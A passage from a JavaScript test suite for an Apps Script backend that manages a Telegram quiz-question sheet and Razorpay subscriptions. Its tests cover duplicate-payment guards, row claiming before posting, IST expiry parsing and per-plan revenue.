  assert.equal(script.locateRow(sheet, map, '', 2, 'The question I thought was here?'), -1,
    'a mismatched row was accepted');
  assert.equal(script.deleteQuestionRow('Polity', '', 2, 'The question I thought was here?'), false);
  assert.equal(sheet.getLastRow(), 2, 'the wrong row was deleted');

  // A bare row number with no text to verify against is also refused.
  assert.equal(script.locateRow(sheet, map, '', 2, ''), -1, 'an unverified row number was accepted');
});

test('setupSpreadsheet keeps existing Telegram thread ids', () => {
  // Re-running setup must never replace real thread ids created by setup.js
  // with the placeholders in SUBJECT_CONFIG_LIST — that silently points every
  // subject at a topic that may not exist.
  const config = new FakeSheet('Config', [
    ['Subject', 'Emoji', 'Topic_Thread_ID', 'Schedule_Cron', 'Questions_Per_Batch', 'Active'],
    ['History', '📜', 9421, '0 9 * * *', 3, 'YES'],
    ['Polity', '', 9422, '0 */2 * * *', 5, 'NO']
  ]);
  const script = loadScript(new FakeSpreadsheet([config]));
  script.setupSpreadsheet();

  const rows = config.values.slice(1);
  const byName = {};
  rows.forEach((r) => { byName[r[0]] = r; });

  assert.equal(byName['History'][2], 9421, 'a real thread id was overwritten with a default');
  assert.equal(byName['Polity'][2], 9422, 'a real thread id was overwritten with a default');
  assert.equal(byName['History'][1], '📜', 'the emoji was lost');
  assert.equal(byName['History'][3], '0 9 * * *', 'the cron was reset');
  assert.equal(byName['Polity'][5], 'NO', 'the Active flag was reset');

  // A subject that was not in Config before still gets its default.
  assert.equal(byName['Biology'][2], 16);
});

test('clearAllQuestions empties every tab but leaves Config alone', () => {
  const s = freshScript();
  const polity = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const config = new FakeSheet('Config', [
    ['Subject', 'Emoji', 'Topic_Thread_ID', 'Schedule_Cron', 'Questions_Per_Batch', 'Active'],
    ['Polity', '', 9422, '0 */2 * * *', 5, 'YES']
  ]);
  const script = loadScript(new FakeSpreadsheet([polity, config]));

  script.appendQuestionsToSheet('Polity', [
    { question: 'One?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' },
    { question: 'Two?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' }
  ], 'Curator', true);
  assert.equal(polity.getLastRow(), 3);

  const report = script.clearAllQuestions();

  assert.equal(polity.getLastRow(), 1, 'questions were not cleared');
  assert.deepEqual(Array.from(polity.values[0]), Array.from(script.QUESTION_HEADERS),
    'the canonical header row was not restored');
  assert.ok(report.some((line) => line.indexOf('Polity: cleared 2') === 0));

  // Config, and the thread id in it, must survive untouched.
  assert.equal(config.getLastRow(), 2, 'Config was cleared');
  assert.equal(config.values[1][2], 9422, 'the Telegram thread id was lost');
});

test('clearAllQuestions is not reachable over HTTP', () => {
  // A destructive whole-bank wipe must never be triggerable by a request.
  const s = freshScript();
  for (const action of ['clearAllQuestions', 'clearSubjectQuestions', 'backfillQuestionIds']) {
    const viaGet = JSON.parse(s.doGet({ parameter: { action } }).text);
    assert.equal(viaGet.success, false, `${action} was reachable via doGet`);

    const viaPost = JSON.parse(s.doPost({ postData: { contents: JSON.stringify({ action }) } }).text);
    assert.equal(viaPost.success, false, `${action} was reachable via doPost`);
  }
});

test('backfillQuestionIds fills only what is missing', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [
    s.QUESTION_HEADERS.slice(),
    ['', 'POL-EXISTING-0001', '', '', 'Polity', '', 'Already has an id?',
     'a', 'b', 'c', 'd', 'A', '', '', '', '', '', 'NO', '', '', '', '', '', 0, '', '', '', '', 'keepme', ''],
    ['', '', '', '', 'Polity', '', 'Needs an id?',
     'a', 'b', 'c', 'd', 'A', '', '', '', '', '', 'NO', '', '', '', '', '', 0, '', '', '', '', '', '']
  ]);
  const script = loadScript(new FakeSpreadsheet([sheet]));
  const map = script.headerMap(sheet);

  assert.equal(script.backfillQuestionIds(), 1, 'should fill exactly one id');
  assert.equal(sheet.values[1][map['Question ID']], 'POL-EXISTING-0001', 'an existing id was overwritten');
  assert.equal(sheet.values[1][map['Dup Hash']], 'keepme', 'an existing hash was overwritten');
  assert.match(sheet.values[2][map['Question ID']], /^POL-\d{8}-\d{4}$/);
  assert.equal(sheet.values[2][map['Dup Hash']].length, 16);
});

test('editing the question text refreshes the duplicate fingerprint', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  const { ids } = script.appendQuestionsToSheet('Polity', [
    { question: 'Original text?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' }
  ], 'Curator', true);

  const map = script.headerMap(sheet);
  const originalHash = sheet.values[1][map['Dup Hash']];

  script.updateQuestionRow('Polity', ids[0], { question: 'Completely different text?' }, 'Editor');
  assert.notEqual(sheet.values[1][map['Dup Hash']], originalHash, 'the fingerprint went stale');
});

// ===========================================================================
// Reading and filtering
// ===========================================================================

test('fetchUnpostedQuestions excludes Rejected and Archived rows', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [
    { question: 'Draft one?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A', status: 'Draft' },
    { question: 'Approved one?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A', status: 'Approved' },
    { question: 'Rejected one?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A', status: 'Rejected' },
    { question: 'Archived one?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A', status: 'Archived' }
  ], 'Curator', true);

  const all = script.fetchUnpostedQuestions('Polity', 50, false);
  assert.deepEqual(Array.from(all, (q) => q.question_text), ['Draft one?', 'Approved one?'],
    'a rejected or archived question must never be eligible for posting');

  const approvedOnly = script.fetchUnpostedQuestions('Polity', 50, true);
  assert.deepEqual(Array.from(approvedOnly, (q) => q.question_text), ['Approved one?']);

  const limited = script.fetchUnpostedQuestions('Polity', 1, false);
  assert.equal(limited.length, 1, 'the limit is respected');
});

test('markRowsAsPostedInSheet records the full posting trail', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [
    { question: 'To be posted?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' }
  ], 'Curator', true);

  const map = script.headerMap(sheet);
  const updated = script.markRowsAsPostedInSheet('Polity', [2], '9001', '12', { 2: 'poll-abc' });

  assert.equal(updated, 1);
  assert.equal(sheet.values[1][map['Posted']], 'YES');
  assert.equal(sheet.values[1][map['Status']], 'Posted');
  assert.equal(sheet.values[1][map['Thread ID']], '12');
  assert.equal(sheet.values[1][map['Telegram Msg ID']], '9001');
  assert.equal(sheet.values[1][map['Poll ID']], 'poll-abc');
  assert.equal(sheet.values[1][map['Times Posted']], 1);
  assert.ok(sheet.values[1][map['Posted At']], 'a timestamp was written');

  // A repost increments the counter rather than overwriting it.
  script.markRowsAsPostedInSheet('Polity', [2], '9002', '12', {});
  assert.equal(sheet.values[1][map['Times Posted']], 2);
});

test('markRowsAsPostedInSheet marks every row of a batch, not just the first two', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  const five = [1, 2, 3, 4, 5].map((n) => ({
    question: `Q${n}?`, option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A'
  }));
  script.appendQuestionsToSheet('Polity', five, 'Curator', true);

  const map = script.headerMap(sheet);
  // Rows 2..6 — the whole batch. The old index-guessing collapsed rows 4, 5 and
  // 6 onto 2, 3 and 4, so only three rows were ever marked and the rest were
  // posted again on the next run.
  const updated = script.markRowsAsPostedInSheet('Polity', [2, 3, 4, 5, 6], '9001', '12', {});

  assert.equal(updated, 5);
  for (let row = 1; row <= 5; row++) {
    assert.equal(sheet.values[row][map['Posted']], 'YES', `row ${row + 1} is marked posted`);
    assert.equal(sheet.values[row][map['Times Posted']], 1, `row ${row + 1} posted exactly once`);
  }
});

test('markRowsAsPostedInSheet ignores a row repeated within one batch', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [
    { question: 'Once?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' }
  ], 'Curator', true);

  const map = script.headerMap(sheet);
  const updated = script.markRowsAsPostedInSheet('Polity', [2, 2, 2], '9001', '12', {});

  assert.equal(updated, 1);
  assert.equal(sheet.values[1][map['Times Posted']], 1);
});

// ===========================================================================
// One payment must count once
// ===========================================================================
// Razorpay delivers a webhook more than once. A real Rs 1 payment was recorded
// as total_paid 2 and renewals 2, with two rows in the payment log a second
// apart, because the caller's "have I seen this payment id?" check reads the
// row and the write happens later — two overlapping deliveries both read
// "new". These are the regression tests for that.

/** A payment webhook payload, as membership.grantAccess would send it. */
function paymentUpsert(overrides) {
  return Object.assign({
    telegram_id: '7234356929',
    username: 'praneeth132006',
    plan: 'sprint_30',
    plan_label: '30-Day Sprint Pass',
    status: 'active',
    expiry_date: '07-10-2026, 05:26:54 PM IST',
    amount: 1,
    payment_id: 'pay_TZ8ciB8Yng8WE3',
    is_payment: true
  }, overrides || {});
}

test('the same payment delivered twice is counted once', () => {
  const script = freshScript();

  const first = script.upsertSubscriber(paymentUpsert());
  assert.equal(first.total_paid, 1);
  assert.equal(first.renewals, 1);
  assert.equal(first.already_counted, false);

  // Byte-identical redelivery, which is what Razorpay actually sends.
  const second = script.upsertSubscriber(paymentUpsert());
  assert.equal(second.total_paid, 1, 'a redelivered payment was added to the takings again');
  assert.equal(second.renewals, 1, 'a redelivered payment counted as a second renewal');
  assert.equal(second.already_counted, true);
});

test('a genuine second payment still counts', () => {
  // The guard keys on the payment id, so it must not swallow a real renewal.
  const script = freshScript();

  script.upsertSubscriber(paymentUpsert());
  const renewed = script.upsertSubscriber(paymentUpsert({
    payment_id: 'pay_A_DIFFERENT_ONE', amount: 3, plan: 'exam_pass'
  }));

  assert.equal(renewed.total_paid, 4, 'Rs 1 then Rs 3 should total Rs 4');
  assert.equal(renewed.renewals, 2);
  assert.equal(renewed.already_counted, false);
});

test('a non-payment update never touches the takings', () => {
  const script = freshScript();
  script.upsertSubscriber(paymentUpsert());

  const cancelled = script.upsertSubscriber({
    telegram_id: '7234356929', status: 'cancelled', is_payment: false
  });

  assert.equal(cancelled.total_paid, 1);
  assert.equal(cancelled.renewals, 1);
});

test('the payment log refuses a second row for one payment id', () => {
  const script = freshScript();

  assert.equal(script.logPayment({
    telegram_id: '7234356929', plan: 'sprint_30', amount: 1,
    payment_id: 'pay_TZ8ciB8Yng8WE3', event: 'payment_link.paid'
  }), true);

  assert.equal(script.logPayment({
    telegram_id: '7234356929', plan: 'sprint_30', amount: 1,
    payment_id: 'pay_TZ8ciB8Yng8WE3', event: 'payment_link.paid'
  }), false, 'the log took a duplicate row for one payment');

  const sheet = script.book().getSheetByName('Payments');
  assert.equal(sheet.getLastRow(), 2, 'header plus exactly one payment row');
});

test('the payment write path takes and releases the script lock', () => {
  // The per-payment check reads then writes. Without serialisation two
  // deliveries arriving together both read "new" and both count.
  const script = freshScript();
  script.upsertSubscriber(paymentUpsert());

  assert.ok(lockLog.some((e) => e.startsWith('lock:')), 'no lock was taken');
  assert.equal(lockLog[lockLog.length - 1], 'release', 'the lock was not released');
  assert.equal(
    lockLog.filter((e) => e.startsWith('lock:')).length,
    lockLog.filter((e) => e === 'release').length,
    'a lock was taken without being released'
  );
});

test('a payment is refused rather than counted when the lock cannot be taken', () => {
  // Razorpay retries anything that is not a 200, so a refusal is recoverable.
  // Writing without the lock is not.
  const script = freshScript();
  lockGrants.push(false);

  assert.throws(() => script.upsertSubscriber(paymentUpsert()), /busy with another payment/);
});

// ===========================================================================
// Posted and Sending are the poster's to write, not a curator's
// ===========================================================================
// They are written together with the Posted column, the message id and the
// poll id. Setting Status alone leaves Status saying "Posted" while the Posted
// column still says NO — so the question stays eligible and goes out again,
// with the dashboard insisting it was already sent.

test('bulk status refuses Posted and Sending', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [{
    question: 'Q1?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A'
  }], 'Curator', true);

  const map = script.headerMap(sheet);
  const id = String(sheet.values[1][map['Question ID']]);

  for (const status of ['Posted', 'Sending']) {
    assert.throws(() => script.bulkSetStatus('Polity', [id], status, 'Curator'),
      /set by the poster, not by hand/, `bulk status accepted "${status}"`);
  }

  // The row is untouched, and still eligible.
  assert.equal(sheet.values[1][map['Posted']], 'NO');
  assert.notEqual(sheet.values[1][map['Status']], 'Posted');
});

test('bulk status still applies every status a curator owns', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [{
    question: 'Q1?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A'
  }], 'Curator', true);

  const map = script.headerMap(sheet);
  const id = String(sheet.values[1][map['Question ID']]);

  for (const status of ['Draft', 'Review', 'Approved', 'Scheduled', 'Rejected', 'Archived']) {
    // The script runs in its own realm, so its objects are compared field by
    // field rather than with deepEqual, which insists on the same prototype.
    const changed = script.bulkSetStatus('Polity', [id], status, 'Curator');
    assert.equal(changed.updatedCount, 1);
    assert.equal(changed.notFound.length, 0);
    assert.equal(changed.skipped.length, 0);
    assert.equal(sheet.values[1][map['Status']], status);
  }
});

test('editing one question cannot set Posted either', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [{
    question: 'Q1?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A'
  }], 'Curator', true);

  const map = script.headerMap(sheet);
  const id = String(sheet.values[1][map['Question ID']]);

  assert.throws(
    () => script.updateQuestionRow('Polity', id, { status: 'Posted' }, 'Curator'),
    /set by the poster, not by hand/
  );
  assert.equal(sheet.values[1][map['Posted']], 'NO');

  // An ordinary edit still works.
  assert.equal(script.updateQuestionRow('Polity', id, { status: 'Approved', topic: 'Rights' }, 'Curator'), true);
  assert.equal(sheet.values[1][map['Status']], 'Approved');
  assert.equal(sheet.values[1][map['Topic']], 'Rights');
});

// ===========================================================================
// Revenue per plan comes from what was charged, not from who holds what
// ===========================================================================

test('a member who changed plan does not credit their whole spend to the new one', () => {
  // total_paid is a lifetime figure. Adding it to whichever plan the member
  // holds today put every rupee they ever paid under that plan and nothing
  // under the one they actually bought first.
  const s = freshScript();
  const subs = new FakeSheet('Subscribers', [s.SUBSCRIBER_HEADERS.slice()]);
  const pays = new FakeSheet('Payments', [s.PAYMENT_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([subs, pays]));

  // One member: Rs 1 sprint pass first, then a Rs 3 exam pass.
  script.upsertSubscriber({
    telegram_id: '1', plan: 'sprint_30', plan_label: '30-Day Sprint Pass',
    status: 'active', expiry_date: '31-12-2030, 11:59:00 PM IST',
    amount: 1, payment_id: 'pay_1', is_payment: true
  });
  script.logPayment({ telegram_id: '1', plan: 'sprint_30', amount: 1, payment_id: 'pay_1', event: 'payment_link.paid' });

  script.upsertSubscriber({
    telegram_id: '1', plan: 'exam_pass', plan_label: 'Target 2026 Pass',
    status: 'active', expiry_date: '31-12-2030, 11:59:00 PM IST',
    amount: 3, payment_id: 'pay_2', is_payment: true
  });
  script.logPayment({ telegram_id: '1', plan: 'exam_pass', amount: 3, payment_id: 'pay_2', event: 'payment_link.paid' });

  const stats = script.buildRevenueStats();

  assert.equal(stats.totalMembers, 1);
  assert.equal(stats.totalRevenue, 4, 'lifetime revenue should be Rs 1 + Rs 3');
  assert.equal(stats.byPlan.sprint_30.revenue, 1, 'the sprint pass earned Rs 1 and must show it');
  assert.equal(stats.byPlan.exam_pass.revenue, 3);
  // Head count still follows the plan they hold NOW, so the retired plan shows
  // the money it earned with nobody currently on it.
  assert.equal(stats.byPlan.exam_pass.count, 1);
  assert.equal(stats.byPlan.sprint_30.count, 0);
});

test('per-plan revenue adds up to total revenue', () => {
  const s = freshScript();
  const subs = new FakeSheet('Subscribers', [s.SUBSCRIBER_HEADERS.slice()]);
  const pays = new FakeSheet('Payments', [s.PAYMENT_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([subs, pays]));

  [['1', 'sprint_30', 1, 'pay_a'], ['2', 'exam_pass', 3, 'pay_b'], ['3', 'sprint_30', 1, 'pay_c']]
    .forEach(([id, plan, amount, paymentId]) => {
      script.upsertSubscriber({
        telegram_id: id, plan, plan_label: plan, status: 'active',
        expiry_date: '31-12-2030, 11:59:00 PM IST', amount, payment_id: paymentId, is_payment: true
      });
      script.logPayment({ telegram_id: id, plan, amount, payment_id: paymentId, event: 'payment_link.paid' });
    });

  const stats = script.buildRevenueStats();
  const summed = Object.keys(stats.byPlan).reduce((t, k) => t + stats.byPlan[k].revenue, 0);
  assert.equal(summed, stats.totalRevenue, 'the plan breakdown does not add up to the total');
  assert.equal(stats.totalRevenue, 5);
});

// ===========================================================================
// A Question ID identifies exactly one row
// ===========================================================================
// Every edit, delete and bulk status change resolves a Question ID to the FIRST
// row that matches. A repeated id therefore means one question silently stands
// in for another — the wrong row edited, the wrong row deleted.

test('an upload never reissues a Question ID that already exists', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  const q = (n) => ({
    question: `Q${n}?`, option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A'
  });

  script.appendQuestionsToSheet('Polity', [q(1), q(2)], 'Curator', true);

  // Someone edits S.No back to 1, the way a hand-tidied sheet ends up. The next
  // upload would otherwise mint the ids the first two rows already hold.
  const map = script.headerMap(sheet);
  sheet.getRange(3, script.colNum(map, 'S.No')).setValue(1);

  script.appendQuestionsToSheet('Polity', [q(3), q(4)], 'Curator', true);

  const ids = sheet.values.slice(1).map((r) => String(r[map['Question ID']]));
  assert.equal(new Set(ids).size, ids.length, `two rows share a Question ID: ${ids.join(', ')}`);
});

test('every id an upload reports back resolves to its own row', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  const result = script.appendQuestionsToSheet('Polity',
    [1, 2, 3, 4, 5].map((n) => ({
      question: `Q${n}?`, option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A'
    })), 'Curator', true);

  const map = script.headerMap(sheet);
  const rows = Array.from(result.ids).map((id) => script.findRowByQuestionId(sheet, map, id));

  assert.deepEqual(rows, [2, 3, 4, 5, 6]);
  assert.equal(new Set(rows).size, rows.length, 'two ids resolved to the same row');
});

test('uploading is serialised, so two uploads cannot mint the same ids', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [{
    question: 'Q1?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A'
  }], 'Curator', true);

  assert.ok(lockLog.some((e) => e.startsWith('lock:')), 'the upload did not take the lock');
  assert.equal(
    lockLog.filter((e) => e.startsWith('lock:')).length,
    lockLog.filter((e) => e === 'release').length,
    'a lock was taken without being released'
  );
});

// ===========================================================================
// Expiry dates are IST, wherever the script thinks it lives
// ===========================================================================
// istNow() writes every stamp with an explicit 'Asia/Kolkata'. parseIstDate
// read them back from LOCAL parts, which is the Apps Script project's own
// timezone — whatever the account was created in. Every expiry then landed
// hours off, and getExpiringSubscribers is what decides who is removed from a
// paid group. The same fault was fixed in src/membership.js; this copy was
// missed, which is why these tests exist.

test('an IST stamp parses to the same instant whatever the local timezone is', () => {
  const script = freshScript();

  // 11:59:59 PM IST on 30-11-2026 is 18:29:59 UTC that day.
  const parsed = script.parseIstDate('30-11-2026, 11:59:59 PM IST');
  assert.equal(parsed.toISOString(), '2026-11-30T18:29:59.000Z');

  // Midday IST is 06:30 UTC.
  assert.equal(
    script.parseIstDate('05-09-2026, 12:00:00 PM IST').toISOString(),
    '2026-09-05T06:30:00.000Z'
  );

  // Midnight IST is 18:30 UTC the day BEFORE — the case a local-time parse
  // gets wrong by a whole calendar day.
  assert.equal(
    script.parseIstDate('01-01-2026, 12:00:00 AM IST').toISOString(),
    '2025-12-31T18:30:00.000Z'
  );
});

test('a bare date is read as the end of that day in IST', () => {
  const script = freshScript();
  assert.equal(script.parseIstDate('30-11-2026').toISOString(), '2026-11-30T18:29:59.000Z');
});

test('parseIstDate refuses what it cannot read rather than guessing', () => {
  const script = freshScript();
  ['', '   ', '-', 'never', '2026-11-30', null, undefined].forEach((value) => {
    assert.equal(script.parseIstDate(value), null, `accepted ${JSON.stringify(value)}`);
  });
});

test('a member is only expiring once their IST expiry is inside the window', () => {
  // The consequence of the parse: 5h30m of drift either strands a lapsed
  // member in the group or removes one who still has hours left.
  const s = freshScript();
  const subs = new FakeSheet('Subscribers', [s.SUBSCRIBER_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([subs]));

  const soon = new Date(Date.now() + 2 * 24 * 60 * 60 * 1000);
  const later = new Date(Date.now() + 20 * 24 * 60 * 60 * 1000);

  // Build the stamps the way the sheet stores them, in IST.
  const istStamp = (d) => {
    const p = new Intl.DateTimeFormat('en-GB', {
      timeZone: 'Asia/Kolkata', day: '2-digit', month: '2-digit', year: 'numeric',
      hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
    }).formatToParts(d);
    const g = (t) => (p.find((x) => x.type === t) || {}).value;
    return `${g('day')}-${g('month')}-${g('year')}, ${g('hour')}:${g('minute')}:${g('second')} ${g('dayPeriod').toUpperCase()} IST`;
  };

  script.upsertSubscriber({
    telegram_id: '111', status: 'active', expiry_date: istStamp(soon), is_payment: false
  });
  script.upsertSubscriber({
    telegram_id: '222', status: 'active', expiry_date: istStamp(later), is_payment: false
  });

  const within7 = Array.from(script.getExpiringSubscribers(7)).map((x) => x.telegram_id);
  assert.deepEqual(within7, ['111'], 'the wrong members were flagged as expiring');

  const within30 = Array.from(script.getExpiringSubscribers(30)).map((x) => x.telegram_id);
  assert.deepEqual(within30.sort(), ['111', '222']);
});

test('a cancelled or expired member is never in the expiring list', () => {
  // Only someone who currently holds access can lapse; re-removing an expired
  // member would send them a second "your pass ended" message every night.
  const s = freshScript();
  const subs = new FakeSheet('Subscribers', [s.SUBSCRIBER_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([subs]));

  script.upsertSubscriber({
    telegram_id: '333', status: 'expired', expiry_date: '01-01-2020, 12:00:00 AM IST', is_payment: false
  });
  script.upsertSubscriber({
    telegram_id: '444', status: 'cancelled', expiry_date: '01-01-2020, 12:00:00 AM IST', is_payment: false
  });

  assert.equal(script.getExpiringSubscribers(365).length, 0);
});

// ===========================================================================
// A question can never be posted twice
// ===========================================================================
// Telegram can accept a poll and still leave the sender with a timeout, so a
// row marked only after a confirmed send is delivered and still looks unposted
// — and goes out again on every run after. Two questions were stuck in exactly
// that loop. Claiming the row BEFORE the send is what stops it.

/** Builds a sheet with `n` approved, unposted questions in rows 2..n+1. */
function sheetWithQuestions(n) {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));
  script.appendQuestionsToSheet('Polity',
    Array.from({ length: n }, (_, i) => ({
      question: `Q${i + 1}?`, option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd',
      correct_answer: 'A', status: 'Approved'
    })), 'Curator', true);

  const map = script.headerMap(sheet);
  for (let row = 2; row <= n + 1; row++) {
    sheet.getRange(row, script.colNum(map, 'Status')).setValue('Approved');
  }
  return { script, sheet, map };
}

test('the Posted column accepts the SENDING marker the poster writes', () => {
  // The Posted column used to carry a requireValueInList('YES','NO') rule with
  // setAllowInvalid(false). Claiming a row writes "SENDING | <when>", which the
  // rule REJECTED — the script threw, Apps Script answered with an HTML error
  // page, and claiming failed against every real sheet.
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  script.appendQuestionsToSheet('Polity', [{
    question: 'Q1?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A'
  }], 'Curator', true);
  script.applyPostedDataValidation(sheet);

  const rules = sheet.validations || [];
  assert.ok(rules.length, 'no validation was applied at all');

  const posted = rules.find((r) => r.values && r.values.includes('YES') && r.values.includes('NO'));
  assert.ok(posted, 'the Posted column has no validation rule');
  assert.notEqual(posted.allowInvalid, false,
    'the Posted rule still rejects "SENDING | <when>", so claiming a row fails');

  const status = rules.find((r) => r.values && r.values.includes('Approved'));
  assert.ok(status, 'the Status column has no validation rule');
  assert.notEqual(status.allowInvalid, false,
    'the Status rule still rejects "Sending"');

  // Difficulty stays strict on purpose: nothing but Easy/Medium/Hard is ever
  // written to it, so a typo there should be refused.
  const difficulty = rules.find((r) => r.values && r.values.includes('Medium'));
  assert.ok(difficulty, 'the Difficulty column has no validation rule');
  assert.equal(difficulty.allowInvalid, false,
    'Difficulty was loosened without reason');
});

test('Sending is one of the statuses the sheet will accept', () => {
  // A rule built before "Sending" existed would reject the status half of a
  // claim even once the Posted half went through.
  const script = freshScript();
  assert.ok(script.STATUS_VALUES.includes('Sending'),
    'Sending is written by claimQuestionRows and must be a legal status');
});

test('a claimed question stops being eligible immediately', () => {
  const { script } = sheetWithQuestions(3);

  assert.equal(script.fetchUnpostedQuestions('Polity', 10, true).length, 3);

  script.claimQuestionRows('Polity', [2, 3]);

  const left = script.fetchUnpostedQuestions('Polity', 10, true);
  assert.equal(left.length, 1, 'a claimed question was offered up for sending again');
  assert.equal(left[0].excel_row, 4);
});

test('a second run cannot claim what the first one already took', () => {
  // The duplicate this exists to prevent: two overlapping posting runs.
  const { script } = sheetWithQuestions(2);

  const first = script.claimQuestionRows('Polity', [2, 3]);
  assert.deepEqual(Array.from(first.claimed), [2, 3]);

  const second = script.claimQuestionRows('Polity', [2, 3]);
  assert.equal(second.claimed.length, 0, 'the same rows were handed out twice');
  assert.deepEqual(Array.from(second.skipped).map((x) => x.reason), ['already sending', 'already sending']);
});

test('an already-posted question is never claimed again', () => {
  const { script } = sheetWithQuestions(2);
  script.markRowsAsPostedInSheet('Polity', [2], '900', '6', {});

  const claim = script.claimQuestionRows('Polity', [2, 3]);
  assert.deepEqual(Array.from(claim.claimed), [3]);
  assert.equal(claim.skipped[0].reason, 'already posted');
});

test('marking a claimed row posted resolves the claim', () => {
  const { script, sheet, map } = sheetWithQuestions(1);

  script.claimQuestionRows('Polity', [2]);
  assert.match(String(sheet.values[1][map['Posted']]), /^SENDING/);

  script.markRowsAsPostedInSheet('Polity', [2], '901', '6', {});
  assert.equal(sheet.values[1][map['Posted']], 'YES');
  assert.equal(sheet.values[1][map['Status']], 'Posted');
  assert.equal(script.fetchUnpostedQuestions('Polity', 10, true).length, 0);
});

test('releasing a claim makes the question available again', () => {
  // Only for a send Telegram refused outright, where nothing was delivered.
  const { script } = sheetWithQuestions(1);

  script.claimQuestionRows('Polity', [2]);
  assert.equal(script.fetchUnpostedQuestions('Polity', 10, true).length, 0);

  assert.equal(script.releaseQuestionRows('Polity', [2], 'Approved'), 1);
  assert.equal(script.fetchUnpostedQuestions('Polity', 10, true).length, 1);
});

test('a claim remembers the status it interrupted', () => {
  const { script, sheet, map } = sheetWithQuestions(1);
  sheet.getRange(2, script.colNum(map, 'Status')).setValue('Scheduled');

  script.claimQuestionRows('Polity', [2]);
  assert.match(String(sheet.values[1][map['Posted']]), /^SENDING \| .* \| Scheduled$/);
});

test('rows a killed run left claimed are put back in the queue, with their status', () => {
  // The bug: a run that stopped half way — a serverless timeout, a closed
  // laptop — left its unsent questions marked Sending for ever. They were not
  // posted, and they could never be posted again either.
  const { script, sheet, map } = sheetWithQuestions(3);
  sheet.getRange(3, script.colNum(map, 'Status')).setValue('Scheduled');
  script.claimQuestionRows('Polity', [2, 3]);
  assert.equal(script.fetchUnpostedQuestions('Polity', 10, true).length, 1);

  // Nothing is taken back from a run that may still be going.
  assert.equal(script.recoverStaleClaims('Polity', 15).recovered.length, 0);

  // Age the claims by rewriting their stamps two hours back.
  const postedCol = script.colNum(map, 'Posted');
  [2, 3].forEach((row) => {
    const parts = String(sheet.values[row - 1][map['Posted']]).split('|');
    sheet.getRange(row, postedCol).setValue('SENDING | 01-01-2020, 10:00:00 AM IST |' + parts[2]);
  });

  const result = script.recoverStaleClaims('Polity', 15);
  assert.deepEqual(Array.from(result.recovered, (r) => r.row), [2, 3]);
  assert.deepEqual(Array.from(result.recovered, (r) => r.status), ['Approved', 'Scheduled'],
    'each row goes back to the status it had, not a guessed one');
  assert.equal(sheet.values[1][map['Posted']], 'NO');
  assert.equal(script.fetchUnpostedQuestions('Polity', 10, true).length, 3,
    'all three are postable again');
});

test('a row held for checking is never handed back automatically', () => {
